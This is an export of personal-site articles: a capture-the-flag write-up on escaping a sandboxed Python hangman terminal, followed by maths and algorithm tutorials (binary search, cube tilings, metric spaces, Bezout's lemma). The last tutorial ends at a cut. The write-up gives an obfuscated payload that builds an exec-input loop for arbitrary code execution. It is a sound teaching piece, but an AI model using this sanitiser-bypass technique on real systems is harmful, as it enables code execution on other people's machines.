[{"type": "article", "coming_soon": false, "mod_timestamp": 1717862400.0, "mod_date_time": "08 Jun 2024", "cr_timestamp": 1717862400.0, "cr_date_time": "08 Jun 2024", "tags": [{"name": "python-golf", "colour": "gray"}], "title": "Terminal Challenge", "content": "A writeup for the hangman challenge on my homepage. As far as I know it\\'s a completely original challenge; if anything I\\'m proud of the implementation and how real the terminal feels. The core idea came from talking with a friend about writing a python file that sanitizes to a fixed string, reminiscent of quines. Hint 1 The hangman game really is unbeatable. The goal of the challenge is to take advantage of the name loading and use that to read the flag. Hint 2 Look at the name verification function. If we can write some python code that sanitizes to ErroryournamedoesntseemtobevalidIllcallyouMrUnimportant, then we can input that as the name and it will pass the verification and thus be written to a file. Then we can run that file just like we ran game.py. So the goal is: write a python file that reads /flag.txt, whose alphanumeric characters in order are Erroryour.... Hint 3 Can you spot any python keywords in the sanitized error message? Research the built-in python functions and see which ones might be useful. We can have variables because underscores are allowed in python variable names. Also we have numbers, by doing something like: _ = \\'\\' < \\'_\\' # one (compares ascii values) __ = _+_+_+_ # four ___ = __*__ # sixteen Solution What follows is one possible solution, that allows arbitrary code execution with a shell, so in particular you can read the flag file. Can you come up with an alternative? For readability, I\\'ve named all variables something representative, but they can all be replaced with underscores (see the minified version). The solution uses a trick of encoding a utf-8 string in utf-16 to garble it. \\'Erroryo\\' U,R,N = \\'urn\\' \\'amedoesn\\' T,S = \\'ts\\' \\'eemtob\\' EVAL = eval STR = EVAL(S+T+R) I,D = \\'id\\' DIR = EVAL(D+I+R) \\'IllcallyouMrUn\\' ONE = \\'\\'<\\'_\\' SEVEN = ONE+ONE+ONE+ONE+ONE+ONE+ONE BUILTINS = STR(EVAL)[ONE:SEVEN-ONE]+I+N+S FUNCS = DIR(EVAL(\\'__import__(\"\\'+BUILTINS+\\'\")\\')) \\'ant\\' EXEC = FUNCS[-SEVEN*SEVEN-ONE-ONE] BYTES = FUNCS[-SEVEN*SEVEN-SEVEN-SEVEN-ONE-ONE] # the garbage characters are a utf16 encoding of the utf8 shellcode, the decoded version is: # while True: exec(input()); SHELLCODE = BYTES+\\'(\"\u6877\u6c69\u2065\u7254\u6575\u203a\u7865\u6365\u6928\u706e\u7475\u2928\u3b29\",\"\\'+U+STR(SEVEN+SEVEN+ONE+ONE)+\\'\")[\\'+STR(ONE+ONE)+\\':]\\' EVAL(EXEC+\\'(\\'+SHELLCODE+\\')\\') And the minified version: \\'Erroryo\\';________,_____,_________=\\'urn\\';\\'amedoesn\\';__________,______=\\'ts\\';\\'eemtob\\';___=eval;____,___________=\\'id\\';\\'IllcallyouMrUn\\';_=\\'\\'<\\'_\\';__=_+_+_+_+_+_+_;___((____________:=___(___________+____+_____)(___(\\'__import__(\"\\'+(_______:=___(______+__________+_____))(___)[_:__-_]+____+_________+______+\\'\")\\')))[-__*__-_-_]+\\'(\\'+____________[-__*__-__-__-_-_]+\\'(\"\u6877\u6c69\u2065\u7254\u6575\u203a\u7865\u6365\u6928\u706e\u7475\u2928\u3b29\",\"\\'+________+_______(__+__+_+_)+\\'\")[\\'+_______(_+_)+\\':]\\'+\\')\\');\\'ant\\' FAQs How did you get Python to run in the browser??? I talked to my comp-sci teacher who helps run this educational tool - and he told me about how they use Pyodide and a web worker. So I implemented that. This is all client-side, so shouldn\\'t I be able to cheese the flag by just looking in F12? Indeed there used to be a cheese solution by just going into F12 and realising that init.py contained the flag (thanks @xp3dx) - but I moved it >:) I have no idea if the flag is still accessible like this because I don\\'t know enough about Next.js, but I will tell you that in my Next.js app it\\'s in components/challenge.js - feel free to try and hunt for it in whatever obsfucated garbage Next.js gives you...", "id": 8217912525260991739, "dir": ["writeups"], "name": "terminal"}, {"type": "article", "coming_soon": false, "mod_timestamp": 1690483800.0, "mod_date_time": "27 Jul 2023", "cr_timestamp": 1690483800.0, "cr_date_time": "27 Jul 2023", "tags": [{"name": "coding", "colour": "blue"}], "title": "Binary Search: an Intuitive Algorithm", "content": "Everyone has performed a binary search without realizing: if you look for the word \"gerontology\" in the dictionary, you wouldn\\'t go flip through every page until you found it. Instead you\\'d check the middle, and if you overshot then you\\'d check the middle of the first chunk, then if you if undershot you\\'d check the middle of the remaining chunk, and so on, until you find the word. In programmer terms, we can use binary search to search for an item in a sorted array. We keep track of a left pointer and a right poiner. Then we check the middle index by (left + right) / 2 (rounding down). For example, if we were wanted to find the index of 8 in the array [1, 2, 5, 7, 8, 9, 10], we\\'d start by setting the left and right pointer to index 0 and index 6 respectively. [1, 2, 5, 7, 8, 9, 10] ^ ^ ^ left=0 mid=3 right=6 Then, since the item we\\'re looking for (8) is larger than the item at the middle, we know that it has to lie to the right of the middle pointer, thus we can update the left pointer to be mid+1. [1, 2, 5, 7, 8, 9, 10] ^ ^ l=4 r=6 Now the middle pointer is at index 5, and points to 9. This is more than 8, so we can update the right pointer to be mid-1: [1, 2, 5, 7, 8, 9, 10] ^ l=r=4 Now the left and right pointer point to the same thing, so we\\'ve found the index of 8: it\\'s 4. Well actually, we need one more check that the item that\\'s being pointed to is actually 8 - for example, if it was 7.5 instead, we\\'d still end up with left = right = 4. The time complexity of binary search is $O(\\\\log n)$ , because each comparison halves the search space, so it takes a logarithmic number of operations (and $\\\\log_2(n) = \\\\frac{\\\\log n}{\\\\log 2}$). Pseudocode I like to define the left pointer as the one you know it\\'s definitely greater than or equal to, and the right pointer as the one you know it\\'s definitely less than. So, $l \\\\leq x \\\\lt r$. function search(arr, length, target) l := 0 r := n-1 while l+1 < r do m := floor((l+r) / 2) if arr[m] > target then r := m else if arr[m] < target then l := m+1 else return m end end end Example problem: Minimum excludant Given a sorted array of distinct positive integers, find the smallest positive integer that is not in the array. Examples Input: [1, 2, 3, 5, 9, 12, 13] Output: 4 Input: [3, 5, 7, 10] Output: 1 Input: [1, 2, 3, 4] Output: 5 Solution Considering the smallest missing element from the array, we must have that the items before it are the positive integers in order, with no gaps. So the smallest missing element is the smallest element whose value is not equal to its index (indexing from 1). We can use binary search to find this. #!/usr/bin/python3 def solve(array): l = 0 r = len(array) while l != r: m = (l+r) // 2 if array[m] != m+1: r = m else: l = m+1 return l+1 Harder problem: Ntarsis\\' Set View problem on codeforces Ntarsis has been given a set $S$, initially containing the integers $1, 2, 3 \\\\cdots, 10^{1000}$ in sorted order. Every day, he removes the $a_1$-th, $a_2$-th, $\\\\cdots$, $a_n$-th smallest numbers in $S$ simultaneously. What is the smallest element in $S$ after $k$ days? Input The first line contains the number of testcases $t \\\\;(1 \\\\leq t \\\\leq 10^5)$. The description of the testcases follows. The first line of each testcase consists of two integers $n$ and $k$ ($1 \\\\leq n, k \\\\leq 2 \\\\cdot 10^5$) - the length of $a$ and the number of days. The following line of each testcase consists of $n$ integers $a_1, a_2, \\\\cdots, a_n$ ($1 \\\\leq a_i \\\\leq 10^9$) - the elements of array $a$. It is guaranteed that: the sum of $n$ over all testcases does not exceed $2 \\\\cdot 10^5$ the sum of $k$ over all testcases does not exceed $2 \\\\cdot 10^5$ $a_1 \\\\lt a_2 \\\\lt \\\\cdots \\\\lt a_n$ for all testcases. Output For each testcase, print an integer that is the smallest element in $S$ after $k$ days. Example Input: 7 5 1 1 2 4 5 6 5 3 1 3 5 6 7 4 1000 2 3 4 5 9 1434 1 4 7 9 12 15 17 18 20 10 4 1 3 5 7 9 11 13 15 17 19 10 6 1 4 7 10 13 16 19 22 25 28 10 150000 1 3 4 5 10 11 12 13 14 15 Output: 3 9 1 12874 16 18 1499986 Solution Let\\'s simulate backwards instead of forwards. Instead of deleting the positions $a_1, a_2, \\\\cdots, a_n$ each time then checking the first number after $k$ operations, let\\'s start with the number $1$ at the front and insert zeroes at positions $a_1 - 1, a_2 - 2, \\\\cdots, a_n - n$ so that the zeroes will occupy positions $a_1, a_2, \\\\cdots, a_n$ after insertion. After $k$ insertions, we check what position $1$ is in. If the current position of $1$ is $x$, then we need to find how many of $a_1, a_2, \\\\cdots, a_n$ (note this is a nondecreasing sequence) are less than or equal to $x$. We can do this by binary searching on $a_1, a_2, \\\\cdots, a_n$ to find the rightmost occurence of the largest number less than or equal to $x$. The index of that item is how many items will be inserted before the 1; thus we add it to $x$ to get the new position of the 1. If $a_1 \\\\neq 1$, then the answer is 1. Otherwise, we start with $x=0$ and perform the process described above $k$ times. The time complexity is $O(n + k \\\\log n)$. C++ solution: #include <bits/stdc++.h> #define ll long long using namespace std; int n, k, a[200010]; void solve() { cin >> n >> k; for(int i=0; i<n; ++i) { cin >> a[i]; a[i] -= i+1; } if(a[0] != 0) { cout << \"1\\\\n\"; return; } ll x = 0; for(int i=0; i<k; ++i) { int l=0, r=n; int m; while(r-l>1) { m = (l+r)/2; if(a[m] > x) r=m; else l=m; } x += (ll)(l+1); } cout << x+1 << \\'\\\\n\\'; } int main() { ios::sync_with_stdio(0); cin.tie(nullptr); int t; cin >> t; while(t--) solve(); }", "id": 2879385941463071755, "dir": ["comp-sci"], "name": "binary-search"}, {"type": "article", "coming_soon": false, "mod_timestamp": 1689364800.0, "mod_date_time": "14 Jul 2023", "cr_timestamp": 1689364800.0, "cr_date_time": "14 Jul 2023", "tags": [{"name": "conjecture", "colour": "purple"}], "title": "Associated Permutations of Complete Non-Ambiguous Trees", "content": "View on arXiV Not much on this page, I just needed somewhere to note down a seemingly magical but random conjecture that we felt wasn\\'t relevant enough to make it into the final paper. Let $h(n,k)$ be the number of Prufer sequences ending in $k$ that represent a tree whose adjacency matrix is a valid CNAT of size $n$. Then: $$h(n,k) = \\\\begin{cases} \\\\frac{(n-1)!}{k(k+1)} & \\\\text{if } 1\\\\leq k < n-1\\\\\\\\0 & \\\\text{if } k=n-1\\\\\\\\(n-2)! & \\\\text{if } k=n \\\\end{cases}$$ We were only able to prove the last two cases.", "id": 1420121757315580502, "dir": ["maths", "research"], "name": "CNATs"}, {"type": "article", "coming_soon": false, "mod_timestamp": 1689609600.0, "mod_date_time": "17 Jul 2023", "cr_timestamp": 1689609600.0, "cr_date_time": "17 Jul 2023", "tags": [{"name": "coding", "colour": "blue"}, {"name": "diagrams", "colour": "green"}], "title": "Filling a cube with 1:2:3 Cuboids", "content": "A positive integer $n$ is \\'lucky\\' if it is possible to fill a cube with $n$ cuboids, each of whom has side ratio 1:2:3. Which numbers are lucky? I encountered this problem while applying to MBL-Balkans 2023. It\\'s essentially a 3D version of the problem discussed in this numberphile video. It\\'s more interesting to ask this version of the question: Let $C$ be the minimal positive integer such that all integers $ \\\\geq C$ are lucky. Find an upper bound on $C$. For example, if we managed to show that all integers greater than 100 are lucky, then an upper bound on $C$ would be 101. Of course, it might be very hard to find the actual value of $C$. Below is the best upper bound on $C$ that I could get - do try the problem yourself and let me know your result. $$C \\\\leq 18$$ Getting a foothold Before we actually find a lucky number, we can try to find some rules of inference, for example \"if $n$ is lucky then so is $n+1000$\". If we can find lots of these, and at least one lucky number, then hopefully we can mark many integers as lucky. We might first notice that if we have a filling of a cube with $n$ cuboids of side ratio 1:2:3, then we can split one of them into 8 new cuboids by halving along each edge. The new number of cuboids is $n+8-1 = n+7$ (minus one because of the cuboid we replaced). So we have that: If $n$ is lucky, then so is $n+7$. This sort of feels like trying to build a cube out of wooden blocks, but the only blocks we have access to are cubes and 1:2:3 cuboids. With this mental imagery, we can find another construction: We used 2 cubes and 3 cuboids, thus if $n$ and $m$ are lucky, we can scale two cubes tiled with $n$ and $m$ cuboids to fit inside this construction. Hence we know that: If $n$ and $m$ are lucky, then so is $n+m+3$. We can continue to try constructions like this. Construction Tools If $n$ is lucky, then so is $n+7$. See above. If $n$ and $m$ are lucky, then so is $n+m+3$. See above. If $n$ and $m$ are lucky, then so is $n+m+8$. If $n$ is lucky, then so is $n+15$. We can make a 6x6x3 cuboid with eleven 1:2:3 cuboids, as shown. Then, we can make another 6x6x3 cuboid using the same construction as in the proof of claim 3, where we wrap 4 cuboids around a cube. Thus we can combine these two 6x6x3 cuboids to form a 6x6x6 cube, using fifteen 1:2:3 cuboids and one smaller cube. If $n$ is lucky, then so is $n+13$. If $n$ is lucky, then so is $n+12$. Finding a base case To actually find a lucky number, we remove cubes from our lego building blocks and only use 1:2:3 cuboids. 8 is lucky. Now, let\\'s see what numbers we can conquer with what we have so far. By Claim 1, we know that 8, 15, 22, 29, 36 etc. are all lucky. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 etc. Now we can use Claim 2 to conquer 8+8+3=19, 8+15+3=26, 15+15+3=33, 15+22+3=40, etc. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 etc. And so on, utilising all of the Claims. In the end, we conquer the following numbers up to 40: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 etc. OK - great! Now we have seven consecutive numbers (26 to 32) all being lucky. Since $n \\\\implies n+7$ (Claim 1), this means every integer greater than or equal to 26 is lucky. So $C$ is at most 26. Reducing the bound with code Have you noticed that in the table above, 25 sticks out like a sore thumb? If we could just show that 25 is lucky, we could add the numbers from 19 to 24 to our chain of consecutive numbers... and C would be at most $19$ - and that would be a good place to stop, because conquering 25 feels like such a bargain (we would reduce C by a lot, not just by 1). But 25 = 18 + 7, so can we show that 18 is lucky? Then we\\'d have $C \\\\leq 18$. 18 feels too big to manually try and search for, so can we write some code to brute force it? Yes we can - if we assume that we can build up tilings by repeatedly joining two cuboids at a time into a larger cuboid, then we can store the side ratios that can be constructed like this. The side ratio is stored as a 3-tuple $(x,y,z)$ with x always equal to 1. To see if we can combine two ratios, we check if the $z$-values are the same, and if so we add their $y$-values (assuming we always join them by placing one cuboid on top of the other - thus for each 3-tuple, we must store all of its 6 permutations). For example, $(1,2,3) + (1,2,3) = (1,4,3)$. We can denote by $S_k$ the set of all side ratios that can be constructed using exactly $k$ 1:2:3 cuboids. We generate $S_k$ by trying to comine all aspect ratios which have $k$ total cuboids, which we can do dynamically (i.e. generate $S_1$, then $S_2$, then $S_3$, etc.). Then, we look at which $S_k$ contain $(1,1,1)$. #!/usr/bin/python3 from fractions import Fraction as F from collections import defaultdict S = {} # normalized fractions: x := 1 S[1] = { (F(1,1),F(2,1),F(3,1)): (), (F(1,1),F(3,1),F(2,1)): (), (F(1,1),F(1,2),F(3,2)): (), (F(1,1),F(3,2),F(1,2)): (), (F(1,1),F(1,3),F(2,3)): (), (F(1,1),F(2,3),F(1,3)): (), } for k in range(2,22): print(k) # compute S_k S[k] = defaultdict(lambda: ((0,0), (0,0))) # (n,key), (m,key) for n in range(1, k//2+1): m = k-n # m+n = k for a in S[n].keys(): for b in S[m].keys(): if a[2] == b[2]: x,y,z = (F(1,1), a[1]+b[1], a[2]) newratios = list(set([ (F(1,1),y/x,z/x), (F(1,1),z/x,y/x), (F(1,1),x/y,z/y), (F(1,1),z/y,x/y), (F(1,1),x/z,y/z), (F(1,1),y/z,x/z), ])) if S[k][newratios[0]] == ((0,0),(0,0)): if newratios[0] == (1,1,1): print(f\"FOUND CUBE FOR S_{k}\") for newratio in newratios: S[k][newratio] = ((n,a),(m,b)) def print_construction(k, r, depth): if k == 1: # terminal nodes displayed with a colon print(\" \"*depth, f\":({r[0]}, {r[1]}, {r[2]})\") return print(\" \"*depth, f\"({r[0]}, {r[1]}, {r[2]})\") ((n,a),(m,b)) = S[k][r] print_construction(n, a, depth+1) print_construction(m, b, depth+1) r = (1, 1, 1) for k in S.keys(): if k==1: continue if S[k][r] != ((0,0),(0,0)): print(f\"found {r} in S_{k}:\") print_construction(k, r, 0) If the program finds $(1,1,1)$ in $S_k$ (i.e. a cube, although you can search for any ratio you want by changing r), then it will print out the way it found to construct it, in a tree-like manner using the recursive print_construction function. The program found the following construction, proving that 18 is lucky: Thus, 18+7=25 is also lucky, and so $C \\\\leq 18$.", "id": 7856225398872821295, "dir": ["maths", "research"], "name": "cube-tilings"}, {"type": "article", "coming_soon": false, "mod_timestamp": 1734390000.0, "mod_date_time": "16 Dec 2024", "cr_timestamp": 1734390000.0, "cr_date_time": "16 Dec 2024", "tags": [], "title": "\u00a71 Basics", "content": "We want to formalise our intuition about distances in the real world, and try to generalise. 1.1 Definitions and Examples Let $X$ be any set. A metric on $X$ is a function $d:X \\\\times X \\\\rightarrow \\\\mathbb{R}$ such that: $d(x,y) \\\\geq 0$, equality iff $x=y$ (\"positive semi-definite\") $d(x,y) = d(y,x)$ (\"symmetric\") $d(x,y) + d(y,z) \\\\geq d(x,z)$ (\"triangle inequality\") We say $(X,d)$ is a metric space.", "id": -7665129883725066952, "dir": ["maths", "Analysis-and-Topology", "A-metric-spaces"], "name": "1-basics"}, {"type": "course", "coming_soon": false, "mod_timestamp": -1, "mod_date_time": "", "cr_timestamp": -1, "cr_date_time": "", "tags": [{"name": "pure-maths", "colour": "indigo"}, {"name": "TODO", "colour": "red"}], "title": "IB Analysis and Topology", "content": "Notes I took for IB Analysis and Topology in the Cambridge Mathematical Tripos in 2024. Aimed at second-year undergraduates. Hopefully I can provide some inutition that might not be present elsewhere. Course Prerequisites Surprisingly not much! Familiarity with mathematical symbols (e.g. here). Basic set theory, for example definition and results regarding function preimage (e.g. preimage of union is union of preimages). Proofs of theorems from IA Analysis I are good to know but not needed; the theorem statements themselves are useful but easily googleable. Resources Example sheet questions Glossary and Style In definitions, the phrase that we define is highlighted like this. Abbreviations: defn = definition iff = if and only if $\\\\subset$ means the same thing as $\\\\subseteq$ (i.e. \"is a subset of, could be equal to\")", "id": -7068470245097917109, "dir": ["maths"], "name": "Analysis-and-Topology"}, {"type": "article", "coming_soon": false, "mod_timestamp": 1690387200.0, "mod_date_time": "26 Jul 2023", "cr_timestamp": 1690387200.0, "cr_date_time": "26 Jul 2023", "tags": [{"name": "number-theory", "colour": "pink"}, {"name": "numerical", "colour": "blue"}], "title": "Bezout's Lemma and the Extended Euclidean Algorithm: Linear Combinations", "content": "tl;dr: A journey from the ground up in which we use axioms to build a proof that every positive integer can be uniquely prime factored. This is part 3, where we discover and prove Bezout\\'s lemma using the division algorithm. In general, the level of rigor will decrease as the parts go on, so that the reader doesn\\'t get bored to death. But it should be obvious how to fill out everything with complete rigor. Here is a glossary of math symbols. Puzzle: water-jug problem You might have heard this one before: There are two water jugs A and B, of size 8 and 5 litres respectively. They have no markings, so it is impossible to tell how much water is in a jug unless it is completely full or completely empty. There is a sink with a water tap and a drain. How can exactly one litre of water be obtained from the tap using the two jugs? It\\'s a fun puzzle - definitely worth playing around with it before reading the solution below. Let $(a,b)$ denote that there are $a$ litres in jug A, and $b$ litres in jug B. $(0,0)$ -> $(8,0)$ -> $(3,5)$ -> $(3,0)$ -> $(0,3)$ -> $(8,3)$ -> $(6,5)$ -> $(6,0)$ -> $(1,5)$ -> $(1,0)$ Now it\\'s time for every mathematician\\'s favourite question: can we generalize it? We start in the state $(0,0)$ and want to end in the state $(1,0)$ (goal state). Notice how one jug must always be empty or full, due to the rules of the question (\"it is impossible to tell how much water is in a jug unless it is completely full or empty\"). Therefore we can deduce that in a valid solution that uses as few operations as possible, the total amount of water only changes by 5 or 8. This is because: transferring water from one jug to another does not change the total amount filling an empty jug will change the total amount by 5 or 8. filling a non-empty but non-full jug is pointless, because the other jug must be empty or full, thus we would obtain the state of both jugs full, or one jug full and one empty, which is backwards progress because those states can be easily reached from $(0,0)$ in 1 or 2 moves. filling a full jug does nothing So now, we have traction on the problem: the total amount of water is initially 0, finally 1, and only changes by 5 or 8. In the general case of the jug capacities being $a$ and $b$, the total must start at 0, end at 1, and change by $a$ or $b$ at each step. Therefore, if we can solve the problem then we must be able to write 1 as a linear combination of $a$ and $b$, i.e. we must be able to find integers $x,y$ such that $ax + by = 1$, because multiplication is repeated addition. In the case of 5 and 8, we can write $1 = 8 \\\\cdot 2 - 5 \\\\cdot 3$, i.e. $1 = 8 + 8 - 5 - 5 - 5$. And so, we\\'ve motivated the main question: Given integers $a,b$, do there exist integers $x,y$ such that $ax+by=1$? If there do not, then the puzzle can\\'t be solved. Numerical Evidence The first thing we might note is that, $ax+by$ will always by divisible by $gcd(a,b)$, no matter what integers $x$ and $y$ we choose (see Lemma 5 in part 1). For example if $a$ is even (divisible by 2) and $b$ is even, then $ax$ and $by$ will both be even, so $ax+by$ will be even. Therefore, if we want $ax+by$ to equal 1, we need $gcd(a,b)$ to be 1, i.e. $a$ and $b$ share no common factors (are \"coprime\"). Now what if they are coprime, say, a=5 and b=8? The key is to write 8 = 5+3. Then a linear combination as 8 and 5 can be rewritten as a linear combination of 3 and 5, and vice versa. Because $8\\\\cdot x + 5 \\\\cdot y$ $= (3 + 5) \\\\cdot x + 5 \\\\cdot y$ $= 3 \\\\cdot x + 5 \\\\cdot (x+y)$. Similarly, a linear combination of 3 and 5 can be transformed into a combination of 3 and 2, which can be transformed into a combination of 1 and 2. But we can always write 1 as a linear combination of 1 and 2, i.e. $1 = 1\\\\cdot 1 + 2\\\\cdot 0$. So theoretically, we should be able to \"undo\" our sequence of transformations to get back to the combination of 5 and 8! Let\\'s try: $$1 = 1\\\\cdot 1 + 2\\\\cdot 0$$ $$ = (3-2)\\\\cdot 1 + 2\\\\cdot 0$$ $$ = 3\\\\cdot 1 + 2\\\\cdot (0-1)$$ $$ = 3\\\\cdot 1 + (5-3)\\\\cdot (-1)$$ $$ = 3\\\\cdot (1+1) + 5\\\\cdot (-1)$$ $$ = (8-5)\\\\cdot 2 + 5\\\\cdot (-1)$$ $$ = 8\\\\cdot 2 + 5\\\\cdot (-1-2)$$ $$ = 8\\\\cdot 2 - 5\\\\cdot 3$$ Which is a linear combination of 5 and 8! Now what about $a=155$ and $b=27$? Let\\'s do the same thing. Note that a linear combination of 155 and 27 is a linear combination of (27*5 + 20) and 27, which is a linear combination of 20 and 27 because $155x + 27y$ $ = (27\\\\cdot 5 + 20)x + 27y$ $= 27(5x+y) + 20x$. And so on, this is a linear combination of 7 and 20, which is a combination of 7 and 6 (because 20 divided by 7 has remainder 6), which is a combination of 7-6=1 and 6. We\\'ve hit 1, so we can start building up the desired combination by going backwards. $$1 = 1\\\\cdot 1 + 6\\\\cdot 0$$ $$ = (7-6)\\\\cdot 1 + 6\\\\cdot 0$$ $$ = 7\\\\cdot 1 + 6\\\\cdot (0-1)$$ $$ = 7\\\\cdot 1 + (20-2\\\\cdot 7)\\\\cdot (-1)$$ $$ = 7\\\\cdot (1+2\\\\cdot 1) + 20\\\\cdot (-1)$$ $$ = (27-20)\\\\cdot 3 + 20\\\\cdot (-1)$$ $$ = 27\\\\cdot 3 + 20\\\\cdot (-1-3)$$ $$ = 27\\\\cdot 3 + (155-5\\\\cdot 27)\\\\cdot (-4)$$ $$ = 27\\\\cdot (3+5\\\\cdot 4) + (155\\\\cdot (-4)$$ $$ = 27\\\\cdot 23 - 155\\\\cdot 4$$ Are you starting to get the idea? Let\\'s do one more example (I also strongly recommend trying some on your own). This time, we\\'ll write out the divisions that we\\'re doing at the start, as well as the reconstruction steps. $a = 259, b = 443$ First, our division steps that \"reduce\" the problem: $$443 = 259 \\\\cdot 1 + 184 \\\\text{, new pair is (259,184)}$$ $$259 = 184 \\\\cdot 1 + 75 \\\\text{, new pair is (184,75)}$$ $$184 = 75 \\\\cdot 2 + 34 \\\\text{, new pair is (75,34)}$$ $$75 = 34 \\\\cdot 2 + 7 \\\\text{, new pair is (34,7)}$$ $$34 = 7 \\\\cdot 4 + 6 \\\\text{, new pair is (7,6)}$$ $$7 = 6 \\\\cdot 1 + 1 \\\\text{, new pair is (6,1)}$$ $$6 = 1 \\\\cdot 6 + 0 \\\\text{, new pair is (1,0)}$$ We stop once we hit (1,0). Now, $1 = 1\\\\cdot 1 - 0\\\\cdot 0$ so we can start reconstructing, by travelling back up the list of divisions. $$1 = 1\\\\cdot 1 - 0 \\\\cdot 0$$ $$ = 1\\\\cdot 1 - (6 - 1\\\\cdot 6) \\\\cdot 0 \\\\text{ (see last line of the division list)}$$ $$ = 1\\\\cdot (1+6\\\\cdot 0) - 6 \\\\cdot 0$$ $$ = (7-6 \\\\cdot 1)\\\\cdot 1 - 6 \\\\cdot 0 \\\\text{ (see penultimate line)}$$ $$ = 7\\\\cdot 1 - 6 \\\\cdot (0+1\\\\cdot 1)$$ $$ = 7\\\\cdot 1 - (34 - 7 \\\\cdot 4) \\\\cdot 1 \\\\text{ (see... etc)}$$ $$ = 7\\\\cdot (1+4\\\\cdot 1) - 34 \\\\cdot 1$$ $$ = (75 - 34\\\\cdot 2)\\\\cdot 5 - 34 \\\\cdot 1$$ $$ = 75\\\\cdot 5 - 34 \\\\cdot (1+2\\\\cdot 5)$$ $$ = 75\\\\cdot 5 - (184 - 75 \\\\cdot 2) \\\\cdot 11$$ $$ = 75\\\\cdot (5 + 2\\\\cdot 11) - 184 \\\\cdot 11$$ $$ = (259-184\\\\cdot 1)\\\\cdot 27 - 184 \\\\cdot 11$$ $$ = 259\\\\cdot 27 - 184 \\\\cdot (11 + 1\\\\cdot 27)$$ $$ = 259\\\\cdot 27 - (443 - 259 \\\\cdot 1) \\\\cdot 38$$ $$ = 259\\\\cdot (27 + 1\\\\cdot 38) - 443 \\\\cdot 38$$ $$ = 259\\\\cdot 65 - 443 \\\\cdot 38$$ which is a solution. Note that I kept the sign in the middle to be negative, which looks like it made all the coefficients positive. By the way, this repeated division process (not including the reconstructing) is called Euclid\\'s Algorithm, and is used to find the gcd of two numbers efficiently. In our case we were finding the gcd of 259 and 443, which is 1, so we ended up with (1,0). Feel free to experiment with what would happen if we had $gcd(a,b) \\\\gt 1$. If we include the reconstructing, then the process of finding a solution to $ax+by=1$ is called the extended Euclidean algorithm (egcd). There are different ways to construct the solution, one of which is exactly as we\\'ve done here. (Feel free to try and generalize what we\\'ve been doing). As long as the initial repeated division (Euclid\\'s algorithm) ends with the pair (1,0), we can perform the reconstruction to find a solution to $ax + by = 1$. In general, Euclid\\'s algorithm ends with the pair being $(gcd(a,b),0)$, so if we do the reconstruction process, we will be able to find a solution to $ax + by = gcd(a,b)$. Bezout\\'s Lemma: Proof Let\\'s switch to our axiom world for a second, to formalize the lemma and prove it. For any two positive integers $a,b$, there exist integers $x,y$ such that $ax + by = gcd(a,b)$. Given that we want to use the well-ordering principle as a proof technique (since it\\'s one of our axioms), we could try to consider the set of all possible $ax+by$ (a,b fixed, x,y vary) and take the smallest one, $e$. Then, if $e \\\\neq gcd(a,b)$ we somehow want to generate an element of the set that is smaller than $e$, so that we can show a contradiction. Let\\'s think about this on the number line. Suppose $a,b$ coprime for simplicity; then we want to show that there is a solution to $ax+by = 1$. If we start at 0 and are allowed to jump left or right by $a$ or $b$, can we get to 1? Well, if we can\\'t, i.e. if the smallest positive number we could reach was $e$ where $e\\\\gt 1$, then we can essentially think of \"going from 0 to e\" as one operation. Then we can go from 0 to e, e to 2e, 2e to 3e, etc., until we get close to $a$ on the number line. By the division algorithm, we can always land in the region between $a,a+e-1$ inclusive. But then we can travel left by a, and we will be in the region between $0, e-1$ inclusive, which is a contradiction because we\\'d be able to reach a smaller number than $e$. Let $a,b \\\\in \\\\mathbb{N}$. Consider the set $$S = \\\\{n \\\\in \\\\mathbb{N} \\\\mid n = ax + by,\\\\; x,y \\\\in \\\\mathbb{Z}\\\\}$$ This set is nonempty (since, for example, $a \\\\in S$) and a subset of the naturals by construction. Thus by the well-ordering principle, S has a least element, say $e = ax_0 + by_0$. $e \\\\mid a$. By the Divison Algorithm, write $a = qe + r$ with $q \\\\in \\\\mathbb{Z}$ and $0 \\\\leq r \\\\lt e$. Then $r = a - q(ax_0 + by_0)$ is a linear combination of $a$ and $b$. But $0 \\\\leq r \\\\lt e$, thus either $r=0$, or $r \\\\in S$ with $r \\\\lt e$. Since the second option contradicts the minimality of $e$, we must have $r=0$, and so $a = qe + 0$ i.e. $e \\\\mid a$. Now by the claim, $e \\\\mid a$. Similarly, repeating the above argument analogously for $b$, we have $e \\\\mid b$. Thus $e$ is a common divisor of $a$ and $b$, so $e \\\\leq gcd(a,b)$ by definition of \"greatest\". But also, recall that $e = ax_0 + by_0$. Since the gcd of a and b divides the RHS by Lemma 4 of the lemma list from part 1, we have that $gcd(a,b) \\\\mid e$, and so $e \\\\geq gcd(a,b)$ by Lemma 19. Overall, since $e \\\\leq gcd(a,b)$ and $e \\\\geq gcd(a,b)$, we have $e = gcd(a,b)$. So $gcd(a,b) = e = ax_0 + by_0$, so $gcd(a,b)$ can be written as a linear combination of $a$ and $b$. Done. Magic box Let\\'s try another concrete example: finding a solution to $29x + 11y = 1$. We could do what we did before, which was the Euclidean Algorithm and then building a solution in reverse. But what if we try the same thing but going forwards? $$29x + 11y = 1$$ $$(2\\\\cdot 11 + 7)x + 11y = 1$$ $$7x + 11(2x+y) = 1$$ $$7x + (7\\\\cdot 1+4)(2x+y) = 1$$ $$7(3x+y) + 4(2x+y) = 1$$ $$(4+3)(3x+y) + 4(2x+y) = 1$$ $$3(3x+y) + 4(5x+2y) = 1$$ $$3(3x+y) + (3+1)(5x+2y) = 1$$ $$3(8x+3y) + 1(5x+2y) = 1$$ $$(3\\\\cdot 1 + 0)(8x+3y) + 1(5x+2y) = 1$$ $$0(8x+3y) + 1(29x + 11y) = 1$$ Uh, oh, it looks like we started with $29x + 11y = 1$ and ended up with $0 + 1(29x+11y) = 1$. Did we go in a circle? It certainly looks like it, apart from one thing - why did we get $(8x+3y)$ in that bracket? Surely there\\'s something special about it. Recall that, when we built up the solution in reverse, we started with \"$0\\\\cdot0 + 1\\\\cdot 1 = 1$\" then built it up. So here, looking at the last line of the above, why don\\'t we set $8x + 3y = 0$? This is easy to find a solution to, e.g. $x=-3, y=8$. What is $29x+11y$ when $x=3$ 